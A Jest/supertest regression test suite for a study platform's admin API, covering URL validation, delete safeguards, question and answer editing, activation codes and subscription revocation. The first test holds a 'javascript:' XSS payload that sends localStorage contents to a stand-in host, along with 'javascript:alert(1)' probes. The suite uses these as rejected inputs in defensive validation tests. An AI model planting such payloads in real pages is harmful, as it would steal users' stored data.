import { describe, it, expect, beforeAll, afterAll } from '@jest/globals';
import request from 'supertest';
import * as jwt from 'jsonwebtoken';
import app from '../src/app';
import { PrismaClient, YearLevel } from '@prisma/client';
import { jest } from '@jest/globals';
import { container } from '../src/config/container';
import PrismaService from '../src/config/db';

const prisma = new PrismaClient();
const tag = `adm${Date.now()}`;
const tokenFor = (id: number, v = 0) => `Bearer ${jwt.sign({ user_data: { id }, token_version: v }, process.env.JWT_SECRET as string, { expiresIn: '1h' })}`;

let admin: number, employee: number, student: number, student2: number;
let pack: number, emptyPack: number, unite: number, moduleId: number, emptyModule: number, course: number;
let univ: number, emptyUniv: number, subscriptionId: number;

beforeAll(async () => {
  const mk = (email: string, role: 'ADMIN' | 'EMPLOYEE' | 'STUDENT') => prisma.user.create({ data: { email: `${tag}-${email}`, passwordHash: 'x', fullName: email, role, emailVerified: true, isActive: true, currentYear: YearLevel.ONE } });
  admin = (await mk('admin@x.io', 'ADMIN')).id;
  employee = (await mk('emp@x.io', 'EMPLOYEE')).id;
  student = (await mk('stu@x.io', 'STUDENT')).id;
  student2 = (await mk('stu2@x.io', 'STUDENT')).id;
  pack = (await prisma.studyPack.create({ data: { name: `${tag} P`, type: 'YEAR', yearNumber: 'ONE', pricePerMonth: 1 } })).id;
  emptyPack = (await prisma.studyPack.create({ data: { name: `${tag} empty`, type: 'YEAR', yearNumber: 'TWO', pricePerMonth: 1 } })).id;
  subscriptionId = (await prisma.subscription.create({ data: { userId: student, studyPackId: pack, status: 'ACTIVE', startDate: new Date(), endDate: new Date(Date.now() + 30 * 86400000), amountPaid: 1000, paymentReference: 'ref-1' } })).id;
  unite = (await prisma.unite.create({ data: { studyPackId: pack, name: `${tag} U` } })).id;
  moduleId = (await prisma.module.create({ data: { uniteId: unite, name: `${tag} M` } })).id;
  emptyModule = (await prisma.module.create({ data: { uniteId: unite, name: `${tag} M2` } })).id;
  course = (await prisma.course.create({ data: { moduleId, name: `${tag} C` } })).id;
  univ = (await prisma.university.create({ data: { name: `${tag} Univ` } })).id;
  emptyUniv = (await prisma.university.create({ data: { name: `${tag} Empty` } })).id;
}, 60000);

afterAll(async () => { await prisma.$disconnect(); });

const api = () => request(app);

describe('Admin security and integrity regressions', () => {
  it('resource externalUrl must be http(s)', async () => {
    const bad = await api().post('/api/v1/admin/content/resources').set('Authorization', tokenFor(employee))
      .send({ type: 'OTHER', title: 'Evil', courseId: course, externalUrl: 'javascript:fetch(`https://e/?t=`+localStorage.getItem(1))' });
    expect(bad.status).toBe(400);
    const ok = await api().post('/api/v1/admin/content/resources').set('Authorization', tokenFor(employee))
      .send({ type: 'OTHER', title: 'Good', courseId: course, externalUrl: 'https://example.com/doc' });
    expect(ok.status).toBe(201);
    const book = await api().post(`/api/v1/admin/modules/${moduleId}/books`).set('Authorization', tokenFor(admin))
      .send({ books: [{ name: 'B', viewUrl: 'javascript:alert(1)' }] });
    expect(book.status).toBe(400);
    const goodBook = await api().post(`/api/v1/admin/modules/${emptyModule}/books`).set('Authorization', tokenFor(admin))
      .send({ books: [{ name: 'B', viewUrl: 'https://drive.google.com/x', coverPath: '/api/v1/media/images/c.png' }] });
    expect(goodBook.status).toBe(201);
    await prisma.moduleBook.deleteMany({ where: { moduleId: emptyModule } });
  });

  it('a saved resource or book is reported as saved even when the activity log fails', async () => {
    const appClient = container.resolve(PrismaService).getClient();
    const logSpy = jest.spyOn(appClient.employeeActivity, 'create');
    const quiet = jest.spyOn(console, 'error').mockImplementation(() => undefined);
    try {
      logSpy.mockRejectedValueOnce(new Error('pool timeout') as never);
      const resource = await api().post('/api/v1/admin/content/resources').set('Authorization', tokenFor(admin))
        .send({ type: 'OTHER', title: `${tag} logged`, courseId: course, externalUrl: 'https://example.com/r' });
      expect(resource.status).toBe(201);
      expect(await prisma.courseResource.count({ where: { title: `${tag} logged` } })).toBe(1);

      logSpy.mockRejectedValueOnce(new Error('pool timeout') as never);
      const books = await api().post(`/api/v1/admin/modules/${emptyModule}/books`).set('Authorization', tokenFor(admin))
        .send({ books: [{ name: `${tag} B1`, viewUrl: 'https://drive.google.com/1' }, { name: `${tag} B2`, viewUrl: 'https://drive.google.com/2' }] });
      expect(books.status).toBe(201);
      expect(books.body.totalCreated).toBe(2);
      expect(await prisma.moduleBook.count({ where: { moduleId: emptyModule } })).toBe(2);
      expect(quiet).toHaveBeenCalledWith('Activity log failed:', 'pool timeout');
    } finally {
      logSpy.mockRestore();
      quiet.mockRestore();
    }

    // Each book carries its id, in the create answer and in the admin list
    const listed = await api().get(`/api/v1/admin/modules/${emptyModule}/books`).set('Authorization', tokenFor(admin));
    expect(listed.status).toBe(200);
    const ids = (await prisma.moduleBook.findMany({ where: { moduleId: emptyModule }, select: { id: true } })).map(b => b.id).sort();
    expect(listed.body.books.map((b: any) => b.id).sort()).toEqual(ids);
    await prisma.moduleBook.deleteMany({ where: { moduleId: emptyModule } });
  });

  it('module image can be set (imagePath or logoUrl) and must be safe', async () => {
    const ok = await api().put(`/api/v1/admin/content/modules/${emptyModule}`).set('Authorization', tokenFor(admin))
      .send({ name: 'Module two', imagePath: '/api/v1/media/logos/m.png' });
    expect(ok.status).toBe(200);
    expect(ok.body.imagePath).toBe('/api/v1/media/logos/m.png');
    const alias = await api().put(`/api/v1/admin/content/modules/${emptyModule}`).set('Authorization', tokenFor(admin))
      .send({ name: 'Module two', logoUrl: 'https://api.example.com/api/v1/media/logos/m2.png' });
    expect(alias.body.logoUrl).toBe('https://api.example.com/api/v1/media/logos/m2.png');
    const bad = await api().put(`/api/v1/admin/content/modules/${emptyModule}`).set('Authorization', tokenFor(admin))
      .send({ name: 'Module two', imagePath: 'javascript:alert(1)' });
    expect(bad.status).toBe(400);
  });

  it('content filters include studyPackId', async () => {
    const res = await api().get('/api/v1/admin/content/filters').set('Authorization', tokenFor(admin));
    expect(res.status).toBe(200);
    const body = res.body.data ?? res.body;
    expect(body.unites.find((u: any) => u.id === unite).studyPackId).toBe(pack);
  });

  it('study pack, module and university deletes refuse instead of cascading', async () => {
    const del = await api().delete(`/api/v1/admin/study-packs/${pack}`).set('Authorization', tokenFor(admin));
    expect(del.status).toBe(409);
    expect(await prisma.subscription.count({ where: { id: subscriptionId } })).toBe(1);
    await expect(prisma.studyPack.delete({ where: { id: pack } })).rejects.toThrow();
    const okDel = await api().delete(`/api/v1/admin/study-packs/${emptyPack}`).set('Authorization', tokenFor(admin));
    expect(okDel.status).toBe(200);

    await prisma.exam.create({ data: { title: 'Exam', moduleId: emptyModule, universityId: univ, yearLevel: 'ONE', examYear: new Date('2024-01-01'), year: 2024, createdById: admin } });
    const mod = await api().delete(`/api/v1/admin/content/modules/${emptyModule}`).set('Authorization', tokenFor(admin));
    expect(mod.status).toBe(409);
    expect(mod.body.error.message).toContain('1 exam(s)');

    const uni = await api().delete(`/api/v1/admin/universities/${univ}`).set('Authorization', tokenFor(admin));
    expect(uni.status).toBe(409);
    const emptyUni = await api().delete(`/api/v1/admin/universities/${emptyUniv}`).set('Authorization', tokenFor(admin));
    expect(emptyUni.status).toBe(200);
  });

  let residencyId: number;
  it('residency: canonical part required (legacy labels mapped), QCM type, newlines kept', async () => {
    const noPart = await api().post('/api/v1/admin/residency-questions').set('Authorization', tokenFor(admin))
      .send({ questionText: 'Q', universityId: univ, examYear: 2020, questionAnswers: [{ answerText: 'a', isCorrect: true }] });
    expect(noPart.status).toBe(400);
    const res = await api().post('/api/v1/admin/residency-questions').set('Authorization', tokenFor(admin))
      .send({ questionText: 'QCM', part: 'Dossier clinique', universityId: univ, examYear: 2020, explanation: 'Réponse:\n\n- A: ok\n- B: ok',
        questionAnswers: [{ answerText: 'a', isCorrect: true }, { answerText: 'b', isCorrect: true }, { answerText: 'c', isCorrect: false }] });
    expect(res.status).toBe(201);
    residencyId = res.body.id;
    const q = await prisma.question.findUnique({ where: { id: residencyId } });
    expect(q!.questionType).toBe('MULTIPLE_CHOICE');
    expect(JSON.parse(q!.metadata!).part).toBe('Dossier_clinique');
    expect(q!.explanation).toBe('Réponse:\n\n- A: ok\n- B: ok');
    const listed = await api().get('/api/v1/admin/residency-questions?limit=100').set('Authorization', tokenFor(admin));
    expect(listed.body.questions.find((x: any) => x.id === residencyId).question.questionType).toBe('MULTIPLE_CHOICE');

    const tooLong = await api().post('/api/v1/admin/residency-questions').set('Authorization', tokenFor(admin))
      .send({ questionText: 'Q', part: 'Dossier_clinique', universityId: univ, examYear: 2020, explanation: 'x'.repeat(20001), questionAnswers: [{ answerText: 'a', isCorrect: true }] });
    expect(tooLong.status).toBe(400);

    const bulk = await api().post('/api/v1/admin/residency-questions/bulk').set('Authorization', tokenFor(admin))
      .send({ universityId: univ, examYear: 2021, part: 'E_Sciences_Fondamentales', questions: [
        { questionText: 'bulk single', questionAnswers: [{ answerText: 'a', isCorrect: true }, { answerText: 'b', isCorrect: false }] },
        { questionText: 'bulk multi', questionAnswers: [{ answerText: 'a', isCorrect: true }, { answerText: 'b', isCorrect: true }] }
      ] });
    expect(bulk.status).toBe(201);
    expect(bulk.body.questions.map((x: any) => x.question.questionType)).toEqual(['SINGLE_CHOICE', 'MULTIPLE_CHOICE']);
    expect(bulk.body.questions[0].part).toBe('Sciences_fondamentales');

    const multipart = await api().post('/api/v1/admin/residency-questions').set('Authorization', tokenFor(admin))
      .field('questionText', 'x').attach('questionImages', Buffer.from('x'), 'a.png');
    expect(multipart.status).toBe(400);
    expect(multipart.body.error.message).toContain('JSON');
  });

  it('residency update keeps answer ids, keeps part, and refuses to drop chosen answers', async () => {
    const before = await prisma.questionAnswer.findMany({ where: { questionId: residencyId }, orderBy: { id: 'asc' } });
    // A student chose answer c in a session
    const session = await prisma.quizSession.create({ data: { userId: student, title: 's', sessionQuestions: { create: [{ questionId: residencyId }] } } });
    await prisma.multipleChoiceAttempt.create({ data: { sessionId: session.id, questionId: residencyId, selectedAnswerIds: JSON.stringify([before[2].id]), isCorrect: false, partialScore: 0 } });

    const edit = await api().put(`/api/v1/admin/residency-questions/${residencyId}`).set('Authorization', tokenFor(admin))
      .send({ metadata: JSON.stringify({ note: 'x' }), questionAnswers: before.map(a => ({ id: a.id, answerText: a.answerText + '!', isCorrect: a.isCorrect })) });
    expect(edit.status).toBe(200);
    const after = await prisma.questionAnswer.findMany({ where: { questionId: residencyId }, orderBy: { id: 'asc' } });
    expect(after.map(a => a.id)).toEqual(before.map(a => a.id));
    expect(after[0].answerText).toBe('a!');
    const q = await prisma.question.findUnique({ where: { id: residencyId } });
    expect(JSON.parse(q!.metadata!)).toEqual({ note: 'x', part: 'Dossier_clinique' });

    const drop = await api().put(`/api/v1/admin/residency-questions/${residencyId}`).set('Authorization', tokenFor(admin))
      .send({ questionAnswers: [{ id: before[0].id, answerText: 'a', isCorrect: true }, { id: before[1].id, answerText: 'b', isCorrect: false }] });
    expect(drop.status).toBe(409);
    const noIds = await api().put(`/api/v1/admin/residency-questions/${residencyId}`).set('Authorization', tokenFor(admin))
      .send({ questionAnswers: [{ answerText: 'a', isCorrect: true }, { answerText: 'b', isCorrect: false }] });
    expect(noIds.status).toBe(409);
    expect(await prisma.questionAnswer.count({ where: { questionId: residencyId } })).toBe(3);

    // Dropping an answer nobody chose works, and the type follows the correct answers
    const ok = await api().put(`/api/v1/admin/residency-questions/${residencyId}`).set('Authorization', tokenFor(admin))
      .send({ questionAnswers: [{ id: before[0].id, answerText: 'a', isCorrect: true }, { id: before[2].id, answerText: 'c', isCorrect: false }] });
    expect(ok.status).toBe(200);
    expect(ok.body.questionType).toBe('SINGLE_CHOICE');
    expect(ok.body.part).toBe('Dossier_clinique');
  });

  it('question update removes missing answers but not chosen ones, and rejects foreign ids', async () => {
    const q = await prisma.question.create({ data: { courseId: course, questionText: 'regular', createdById: admin, questionAnswers: { create: [{ answerText: 'a', isCorrect: true }, { answerText: 'b', isCorrect: false }, { answerText: 'c', isCorrect: false }] } }, include: { questionAnswers: { orderBy: { id: 'asc' } } } });
    const [a, b, c] = q.questionAnswers;
    const session = await prisma.quizSession.create({ data: { userId: student, title: 's2', sessionQuestions: { create: [{ questionId: q.id }] } } });
    await prisma.quizAttempt.create({ data: { sessionId: session.id, questionId: q.id, selectedAnswerId: b.id, isCorrect: false } });

    const removeC = await api().put(`/api/v1/admin/questions/${q.id}`).set('Authorization', tokenFor(employee))
      .send({ answers: [{ id: a.id, answerText: 'a', isCorrect: true }, { id: b.id, answerText: 'b2', isCorrect: false }, { answerText: 'd', isCorrect: false }] });
    expect(removeC.status).toBe(200);
    const now = await prisma.questionAnswer.findMany({ where: { questionId: q.id }, orderBy: { id: 'asc' } });
    expect(now.map(x => x.answerText)).toEqual(['a', 'b2', 'd']);
    expect(now.find(x => x.id === c.id)).toBeUndefined();

    const removeB = await api().put(`/api/v1/admin/questions/${q.id}`).set('Authorization', tokenFor(employee))
      .send({ answers: [{ id: a.id, answerText: 'a', isCorrect: true }] });
    expect(removeB.status).toBe(409);
    const foreign = await api().put(`/api/v1/admin/questions/${q.id}`).set('Authorization', tokenFor(employee))
      .send({ answers: [{ id: a.id, answerText: 'a', isCorrect: true }, { id: b.id, answerText: 'b', isCorrect: false }, { id: 999999, answerText: 'x', isCorrect: false }] });
    expect(foreign.status).toBe(400);
  });

  it('explanation update accepts multipart with images', async () => {
    const q = await prisma.question.create({ data: { courseId: course, questionText: 'expl', createdById: admin } });
    const png = Buffer.from('89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4890000000d4944415478da63f8ffff3f0005fe02fea7d6a3a40000000049454e44ae426082', 'hex');
    const res = await api().put(`/api/v1/admin/questions/${q.id}/explanation`).set('Authorization', tokenFor(admin))
      .field('explanation', 'Line 1\nLine 2').attach('explanationImages', png, { filename: 'e.png', contentType: 'image/png' });
    expect(res.status).toBe(200);
    const stored = await prisma.question.findUnique({ where: { id: q.id }, include: { questionExplanationImages: true } });
    expect(stored!.explanation).toBe('Line 1\nLine 2');
    expect(stored!.questionExplanationImages).toHaveLength(1);
    const json = await api().put(`/api/v1/admin/questions/${q.id}/explanation`).set('Authorization', tokenFor(admin)).send({ explanation: 'json' });
    expect(json.status).toBe(200);
  });

  it('upload errors and oversized bodies return 4xx, bulk admin bodies over 100 KB are accepted', async () => {
    const wrongField = await api().post('/api/v1/admin/upload/logo').set('Authorization', tokenFor(admin)).attach('wrong', Buffer.from('x'), 'a.png');
    expect(wrongField.status).toBe(400);
    const questions = Array.from({ length: 150 }, (_, i) => ({ questionText: `Big question ${i} ` + 'x'.repeat(1500), questionAnswers: [{ answerText: 'a', isCorrect: true }, { answerText: 'b', isCorrect: false }] }));
    const big = await api().post('/api/v1/admin/residency-questions/bulk').set('Authorization', tokenFor(admin))
      .send({ universityId: univ, examYear: 2022, part: 'Sciences_fondamentales', questions });
    expect(big.status).toBe(201);
    expect(big.body.totalCreated).toBe(150);
    const huge = await api().post('/api/v1/students/notes').set('Authorization', tokenFor(student)).set('Content-Type', 'application/json').send(JSON.stringify({ noteText: 'x'.repeat(1_100_000) }));
    expect(huge.status).toBe(413);
  });

  it('question report review uses the ReportStatus enum and the old {action, response} shape', async () => {
    const q = await prisma.question.create({ data: { courseId: course, questionText: 'reported', createdById: admin } });
    const report = await prisma.questionReport.create({ data: { userId: student, questionId: q.id, reportType: 'TYPO' } });
    const dismissed = await api().put(`/api/v1/admin/questions/reports/${report.id}`).set('Authorization', tokenFor(employee)).send({ status: 'DISMISSED' });
    expect(dismissed.status).toBe(200);
    expect(dismissed.body.status).toBe('DISMISSED');
    const legacy = await api().put(`/api/v1/admin/questions/reports/${report.id}`).set('Authorization', tokenFor(employee)).send({ action: 'RESOLVED', response: 'fixed' });
    expect(legacy.status).toBe(200);
    expect(legacy.body).toMatchObject({ status: 'RESOLVED', adminNotes: 'fixed' });
    const rejected = await api().put(`/api/v1/admin/questions/reports/${report.id}`).set('Authorization', tokenFor(employee)).send({ status: 'REJECTED' });
    expect(rejected.status).toBe(400);
    const list = await api().get('/api/v1/admin/questions/reports?status=REJECTED').set('Authorization', tokenFor(employee));
    expect(list.status).toBe(400);
  });

  it('activation codes: stored in the redeemable format, CSPRNG-generated, fully editable', async () => {
    const promo = `promo-${String(Date.now()).slice(-8)}x`;
    const created = await api().post('/api/v1/admin/activation-codes').set('Authorization', tokenFor(admin)).send({ code: promo, studyPackIds: [pack], durationType: 'MONTHS', durationMonths: 12 });
    expect(created.status).toBe(201);
    expect(created.body.code).toBe(promo.toUpperCase());
    expect(created.body.durationMonths).toBe(12);
    const invalid = await api().post('/api/v1/admin/activation-codes').set('Authorization', tokenFor(admin)).send({ code: 'VIP_2025', studyPackIds: [pack] });
    expect(invalid.status).toBe(400);
    const short = await api().post('/api/v1/admin/activation-codes').set('Authorization', tokenFor(admin)).send({ code: 'FREE1', studyPackIds: [pack] });
    expect(short.status).toBe(400);
    const validate = await api().post('/api/v1/students/codes/validate').set('Authorization', tokenFor(student2)).send({ code: promo });
    expect(validate.status).toBe(200);

    const pack2 = (await prisma.studyPack.create({ data: { name: `${tag} P2`, type: 'YEAR', yearNumber: 'THREE', pricePerMonth: 1 } })).id;
    const updated = await api().put(`/api/v1/admin/activation-codes/${created.body.id}`).set('Authorization', tokenFor(admin))
      .send({ studyPackIds: [pack, pack2], durationType: 'DAYS', durationDays: 10, description: 'desc' });
    expect(updated.status).toBe(200);
    expect(updated.body).toMatchObject({ durationType: 'DAYS', durationDays: 10, description: 'desc' });
    expect(updated.body.studyPacks.map((p: any) => p.id).sort()).toEqual([pack, pack2].sort());
    const auto = await api().post('/api/v1/admin/activation-codes').set('Authorization', tokenFor(admin)).send({ studyPackIds: [pack] });
    expect(auto.body.code).toMatch(/^[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}$/);
  });

  it('exam creation keeps the validated questionType and links questions to the exam', async () => {
    const res = await api().post('/api/v1/admin/exams').set('Authorization', tokenFor(employee)).send({
      title: 'Employee exam', moduleId, universityId: univ, yearLevel: 'ONE', examYear: '2023', year: 2023,
      questions: [{ questionText: 'Which are correct?', questionType: 'MULTIPLE_CHOICE', answers: [{ answerText: 'a', isCorrect: true }, { answerText: 'b', isCorrect: true }] }]
    });
    expect(res.status).toBeLessThan(300);
    const q = await prisma.question.findFirst({ where: { questionText: 'Which are correct?' } });
    expect(q!.questionType).toBe('MULTIPLE_CHOICE');
    expect(q!.examId).not.toBeNull();
  });

  it('cancelling a subscription revokes access immediately; deactivation ends sessions', async () => {
    const token = tokenFor(student);
    const before = await api().get('/api/v1/students/content/filters').set('Authorization', token);
    expect(before.status).toBe(200);
    const cancel = await api().post(`/api/v1/admin/subscriptions/${subscriptionId}/cancel`).set('Authorization', tokenFor(admin)).send({ reason: 'refund' });
    expect(cancel.status).toBe(200);
    const after = await api().get('/api/v1/students/content/filters').set('Authorization', token);
    expect(after.status).toBe(403);

    await prisma.refreshToken.create({ data: { userId: student2, token: `${tag}-rt`, expiresAt: new Date(Date.now() + 86400000) } as any }).catch(() => undefined);
    const deact = await api().delete(`/api/v1/admin/users/${student2}`).set('Authorization', tokenFor(admin));
    expect(deact.status).toBe(200);
    expect(await prisma.refreshToken.count({ where: { userId: student2 } })).toBe(0);
    const u = await prisma.user.findUnique({ where: { id: student2 } });
    expect(u!.tokenVersion).toBe(1);
  });
  it('residency create requires university and exam year; redeemed activation codes are not deletable', async () => {
    const base = { questionText: 'Q', part: 'Dossier clinique', questionAnswers: [{ answerText: 'a', isCorrect: true }] };
    const noUniversity = await api().post('/api/v1/admin/residency-questions').set('Authorization', tokenFor(admin))
      .send({ ...base, examYear: 2020 });
    expect(noUniversity.status).toBe(400);
    const noYear = await api().post('/api/v1/admin/residency-questions').set('Authorization', tokenFor(admin))
      .send({ ...base, universityId: univ });
    expect(noYear.status).toBe(400);

    const makeCode = (suffix: string) => prisma.activationCode.create({ data: {
      code: `${tag}${suffix}`.toUpperCase(), hashedCode: 'x', durationMonths: 1,
      expiresAt: new Date(Date.now() + 86400000), createdById: admin } });
    const redeemed = await makeCode('R');
    await prisma.codeRedemption.create({ data: { activationCodeId: redeemed.id, userId: student } });
    const blocked = await api().delete(`/api/v1/admin/activation-codes/${redeemed.id}`).set('Authorization', tokenFor(admin));
    expect(blocked.status).toBe(409);
    expect(await prisma.codeRedemption.count({ where: { activationCodeId: redeemed.id } })).toBe(1);

    const unused = await makeCode('U');
    const deleted = await api().delete(`/api/v1/admin/activation-codes/${unused.id}`).set('Authorization', tokenFor(admin));
    expect(deleted.status).toBe(200);
  });
});
